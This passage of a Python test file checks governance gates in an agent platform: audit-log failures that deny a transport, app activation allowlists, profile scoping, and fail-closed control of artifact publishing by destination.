            gw._channel_transport_permitted("telegram")

    def test_governed_allow_real_sel_persistence_failure_denies(self, tmp_path, monkeypatch):
        # F2-2 (end-to-end, REAL SecurityEventLog): prove the critical→log→
        # synchronous-raise chain end to end. A GOVERNED transport start whose
        # audit file CANNOT be written is DENIED. Uses a REAL SecurityEventLog in
        # sync mode whose file append is forced to fail (monkeypatch os.open in the
        # sel module to raise OSError). This proves production
        # log_governance_decision forwards critical= to log(critical=True) →
        # _flush_batch(raise_on_error=True) → raise; reverting that forwarding
        # would make the write a swallowed enqueue and the transport would WRONGLY
        # start, failing this test.
        import dataclasses

        from kiro_crew import sel as sel_mod
        from kiro_crew.config.loader import KiroCrewConfig
        from kiro_crew.platform import context as ctx_mod
        from kiro_crew.platform.bootstrap import build_default_context
        from kiro_crew.platform.governance import parse_policy
        from kiro_crew.slack import gateway as gw

        # Fresh REAL sync SEL in a valid tmp dir (reset the singleton first).
        sel_mod.SecurityEventLog._instance = None
        sel_mod.SecurityEventLog._initialized = False
        real_sel = sel_mod.SecurityEventLog(base_dir=tmp_path, sync=True)
        sel_mod.SecurityEventLog._instance = None
        sel_mod.SecurityEventLog._initialized = False

        # Force the audit FILE APPEND to fail (a genuine persistence failure that
        # only surfaces because critical=True makes _flush_batch raise).
        def _boom_open(*_a, **_k):
            raise OSError("SEL append failed (disk full)")

        monkeypatch.setattr(sel_mod.os, "open", _boom_open)
        monkeypatch.setattr(gw, "sel", lambda: real_sel)

        # Governed ceiling that permits telegram → the gate audits critical=True.
        base = build_default_context(KiroCrewConfig.load())
        ceiling = parse_policy(
            {
                "version": 1,
                "boot": {"fail_closed": True},
                "channels": {"members": {"mode": "allow", "allow": ["telegram"]}},
            }
        )
        ctx_mod.set_context(dataclasses.replace(base, governance=ceiling))
        try:
            # Governed allow → critical audit → real sync write RAISES → outer
            # except → transport DENIED.
            assert gw._channel_transport_permitted("telegram") is False
        finally:
            ctx_mod.set_context(None)
            sel_mod.SecurityEventLog._instance = None
            sel_mod.SecurityEventLog._initialized = False


# ── apps activation allowlist ──
class TestAppsGate:
    def test_app_not_in_allowlist_blocked(self):
        _install(
            {
                "version": 1,
                "boot": {"fail_closed": True},
                "apps": {"mode": "allow", "allow": ["auto-research"]},
            }
        )
        from kiro_crew.apps import manager

        assert manager._app_activation_denied("deploy-web") is not None
        assert manager._app_activation_denied("auto-research") is None

    def test_ungoverned_allows(self):
        _install(None)
        from kiro_crew.apps import manager

        assert manager._app_activation_denied("anything") is None

    def test_platform_composition_error_still_propagates(self, monkeypatch):
        from kiro_crew.apps import manager
        from kiro_crew.platform.context import PlatformCompositionError

        def _raise_composition_error(*_args, **kwargs):
            assert kwargs["fail_closed"] is True
            raise PlatformCompositionError("governance composition failed")

        monkeypatch.setattr(gp, "governance_permits", _raise_composition_error)
        with pytest.raises(PlatformCompositionError, match="governance composition failed"):
            manager._app_activation_denied("anything", fail_closed=True)

    def test_host_bound_profile_governs_app_activation(self):
        # H-p4: app activation runs through the _host session key
        # (surface "host"), so a profile bound to surface:host narrows it on top
        # of the policy ceiling — an honest, stable bind target. Policy allows the
        # app; a host-bound profile denies it → activation blocked.
        _install(
            {
                "version": 1,
                "boot": {"fail_closed": True},
                "apps": {"mode": "allow", "allow": ["deploy-web", "auto-research"]},
            }
        )
        import json

        (gp._PROFILES_DIR / "hostp.json").write_text(
            json.dumps(
                {
                    "name": "hostp",
                    "bind": {"type": "surface", "id": "host"},
                    "apps": {"mode": "allow", "allow": ["auto-research"]},  # narrower
                }
            )
        )
        gp.reset_store()
        from kiro_crew.apps import manager

        # Within both policy AND host profile → allowed.
        assert manager._app_activation_denied("auto-research") is None
        # Allowed by policy but NOT by the host profile → blocked (profile narrows).
        assert manager._app_activation_denied("deploy-web") is not None

    def test_slack_bound_profile_does_not_leak_to_app_activation(self):
        # H-p4: a profile bound to surface:slack must NOT govern
        # host-side app activation (it did, accidentally, when an empty key
        # mis-classified to "slack"). The host caller uses surface "host", so a
        # slack-bound apps-deny does not apply.
        _install(
            {
                "version": 1,
                "boot": {"fail_closed": True},
                "apps": {"mode": "allow", "allow": ["deploy-web"]},
            }
        )
        import json

        (gp._PROFILES_DIR / "slackp.json").write_text(
            json.dumps(
                {
                    "name": "slackp",
                    "bind": {"type": "surface", "id": "slack"},
                    "apps": {"mode": "allow", "allow": []},  # would deny ALL apps
                }
            )
        )
        gp.reset_store()
        from kiro_crew.apps import manager

        # The slack-bound deny-all-apps profile must NOT apply host-side.
        assert manager._app_activation_denied("deploy-web") is None


def tmp_profile_dir(monkeypatch):
    """Return the monkeypatched profiles dir (created by the _isolate fixture)."""
    return gp._PROFILES_DIR


# ── capabilities.publish gate (artifact publish Plane-C chokepoint) ──
class TestPublishGovernanceGate:
    """The artifact-publish chokepoint (``_publish_governance_denied``) enforces
    the ``capabilities.publish`` ceiling AND the ``publish.allowed_destinations``
    config allowlist. Publishing is an HTTP action the host gate never sees."""

    @staticmethod
    def _req(session_key: str = "dashboard:ui"):
        from unittest.mock import MagicMock

        req = MagicMock()
        req.headers.get.return_value = session_key
        return req

    def test_ungoverned_permits(self):
        from kiro_crew.dashboard.handlers.artifacts import _publish_governance_denied

        _install(None)
        assert _publish_governance_denied(self._req(), "provider-a") is None

    def test_capability_disabled_blocks(self):
        from kiro_crew.dashboard.handlers.artifacts import _publish_governance_denied

        _install(
            {
                "version": 1,
                "boot": {"fail_closed": True},
                "capabilities": {"publish": {"enabled": False}},
            }
        )
        reason = _publish_governance_denied(self._req(), "provider-a")
        assert reason is not None

    def test_destination_not_in_ruleset_blocks(self):
        from kiro_crew.dashboard.handlers.artifacts import _publish_governance_denied

        _install(
            {
                "version": 1,
                "boot": {"fail_closed": True},
                "capabilities": {
                    "publish": {
                        "enabled": True,
                        "scopes": {"destinations": {"mode": "allow", "allow": ["provider-a"]}},
                    }
                },
            }
        )
        assert _publish_governance_denied(self._req(), "provider-a") is None
        assert _publish_governance_denied(self._req(), "provider-b") is not None

    def test_config_allowlist_narrows(self, monkeypatch):
        # Default-open ceiling, but the operator's config allowlist restricts to
        # a single destination — config narrows, never widens.
        from kiro_crew.config.loader import KiroCrewConfig, PublishConfig
        from kiro_crew.dashboard.handlers import artifacts as art

        _install(None)
        cfg = KiroCrewConfig.load()
        cfg.publish = PublishConfig(allowed_destinations=["provider-a"])
        monkeypatch.setattr(KiroCrewConfig, "load", staticmethod(lambda: cfg))
        assert art._publish_governance_denied(self._req(), "provider-a") is None
        assert art._publish_governance_denied(self._req(), "provider-b") is not None

    def test_composition_error_propagates(self, monkeypatch):
        from kiro_crew.dashboard.handlers import artifacts as art
        from kiro_crew.platform.context import PlatformCompositionError

        def _compose_fail(*a, **k):
            raise PlatformCompositionError("companion missing")

        monkeypatch.setattr(gp, "governance_permits", _compose_fail)
        with pytest.raises(PlatformCompositionError):
            art._publish_governance_denied(self._req(), "provider-a")

    def test_generic_governance_error_fails_closed(self, monkeypatch):
        # Unlike messaging/cron (fail-open on a transient error), the publish
        # gate is an exfil authorization decision and must DENY when governance
        # cannot be evaluated.
        from kiro_crew.dashboard.handlers import artifacts as art

        def _boom(*a, **k):
            raise RuntimeError("governance module broken")

        monkeypatch.setattr(gp, "governance_permits", _boom)
        _install(None)
        reason = art._publish_governance_denied(self._req(), "provider-a")
        assert reason is not None and "governance could not be evaluated" in reason

    def test_internal_resolve_error_fails_closed(self, monkeypatch):
        # Regression (PR #14 alice): governance_permits SWALLOWS its own internal
        # errors and, by default, degrades to a permissive Decision. The publish
        # gate calls it with fail_closed=True, so an error raised INSIDE
        # governance_permits (e.g. resolve() throwing) must still DENY — the
        # handler-level except never sees this error. Before the fix this path
        # returned permitted==True and the gate wrongly permitted the publish.
        from kiro_crew.dashboard.handlers import artifacts as art

        def _resolve_boom(*a, **k):
            raise RuntimeError("resolver exploded")

        # Install a real ceiling so resolve() is actually invoked, then make it throw.
        _install({"version": 1, "boot": {"fail_closed": True}})
        monkeypatch.setattr(gp, "resolve", _resolve_boom, raising=False)
        # governance_permits imports resolve locally; patch at its source module.
        from kiro_crew.platform import governance as gov_mod

        monkeypatch.setattr(gov_mod, "resolve", _resolve_boom)
        reason = art._publish_governance_denied(self._req(), "provider-a")
        assert reason is not None

    def test_governance_permits_fail_closed_flag(self, monkeypatch):
        # Unit-level: the shared helper denies on an internal error ONLY when
        # fail_closed=True; the default (messaging/cron) still degrades to permit.
        from kiro_crew.platform import governance as gov_mod

        def _resolve_boom(*a, **k):
            raise RuntimeError("resolver exploded")

        _install({"version": 1, "boot": {"fail_closed": True}})
        monkeypatch.setattr(gov_mod, "resolve", _resolve_boom)

        permit_default = gp.governance_permits("capabilities.publish", "destinations:provider-a")
        assert getattr(permit_default, "permitted", None) is True  # degrade-to-permit

        deny = gp.governance_permits(
            "capabilities.publish", "destinations:provider-a", fail_closed=True
        )
        assert getattr(deny, "permitted", None) is False  # fail-closed DENY

    def test_fail_closed_does_not_affect_ungoverned_user(self):
        # A user with ZERO governance config (no ceiling, no profiles) must never
        # be denied by fail_closed=True: governance_permits returns early with an
        # "ungoverned" permit BEFORE the except branch fail_closed lives in, so
        # the flag is a no-op for the common standalone case. Guards against a
        # future refactor accidentally routing ungoverned users through DENY.
        _install(None)  # no ceiling
        # No profiles bound (autouse _isolate fixture points profiles dir at an
        # empty tmp dir), so every surface resolves to policy-only == ungoverned.
        for sk in ("dashboard:ui", "", "slack:U1", "chat:main"):
            d = gp.governance_permits(
                "capabilities.publish",
                "destinations:provider-a",
                session_key=sk,
                fail_closed=True,
            )
            assert getattr(d, "permitted", None) is True, sk
        # End-to-end: the handler gate permits (returns None) for an ungoverned
        # dashboard user even with the fail_closed call site.
        from kiro_crew.dashboard.handlers import artifacts as art

        assert art._publish_governance_denied(self._req(), "provider-a") is None

    def test_config_load_failure_fails_closed(self, monkeypatch):
        from kiro_crew.config.loader import KiroCrewConfig
        from kiro_crew.dashboard.handlers import artifacts as art

        _install(None)  # governance permits; the config read is what fails

        def _boom():
            raise RuntimeError("config unreadable")

        monkeypatch.setattr(KiroCrewConfig, "load", staticmethod(_boom))
        reason = art._publish_governance_denied(self._req(), "provider-a")
        assert reason is not None and "config could not be loaded" in reason

    @pytest.mark.asyncio
    async def test_republish_gates_on_existing_provider(self, tmp_path, monkeypatch):
        # Regression (PR #14 alice): a re-publish with NO explicit provider in the
        # body must gate on the EXISTING publication's provider, not the default
        # "provider-a". publish_sync.publish() dispatches to the existing
        # provider, so gating on "provider-a" while the artifact is published to
        # "provider-b" would push bytes to a DENIED destination. Policy: allow
        # provider-a, deny everything else.
        import json
        from unittest.mock import AsyncMock, MagicMock

        from kiro_crew import artifacts as art_mod
        from kiro_crew.artifacts import ArtifactPublication, ArtifactStore
        from kiro_crew.dashboard.handlers import artifacts as art

        store = ArtifactStore(root=tmp_path / "artifacts")
        store.create(name="Doc", content="hi", slug="doc", kind="markdown")
        store.set_publication(
            "doc",
            ArtifactPublication(artifact_id="ext-1", view_url="http://x", provider="provider-b"),
        )
        monkeypatch.setattr(art_mod, "_default_store", store)
        monkeypatch.setattr(art, "_is_restricted_session", lambda state, request: False)
        # Should never be reached — the gate must deny before dispatch.
        monkeypatch.setattr(
            art.publish_sync, "publish", AsyncMock(side_effect=AssertionError("gate bypassed"))
        )
        _install(
            {
                "version": 1,
                "boot": {"fail_closed": True},
                "capabilities": {
                    "publish": {
                        "enabled": True,
                        "scopes": {"destinations": {"mode": "allow", "allow": ["provider-a"]}},
                    }
                },
            }
        )
        req = MagicMock()
        req.app = {"state": MagicMock()}
        req.headers = {"X-Session-Key": "dashboard:ui"}
        req.match_info = {"slug": "doc"}
        req.query = {}
        # Body omits "provider" — the pre-fix code would default to "provider-a"
        # (allowed) and permit the push to the provider-b-published artifact.
        attach_json_body(req, json.dumps({"visibility": "PRIVATE"}).encode())
        resp = await art.api_artifact_publish(req)
        assert resp.status == 403
